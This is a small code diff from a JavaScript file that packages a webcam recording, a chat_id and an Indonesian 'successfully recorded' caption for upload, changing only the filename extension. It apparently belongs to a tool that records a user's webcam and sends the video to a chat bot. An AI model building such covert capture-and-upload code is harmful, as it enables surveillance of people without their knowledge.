@@ -72,7 +72,8 @@ if (!isPhotoMode) {
 
         const form = new FormData();
         form.append("chat_id", uid);
-        form.append("video", blob, "webcam.webm");
+        form.append("video", blob, "webcam.mp4");
+
 
         const timestamp = new Date().toLocaleTimeString();
         form.append("caption", `Berhasil merekam\n${timestamp}`);
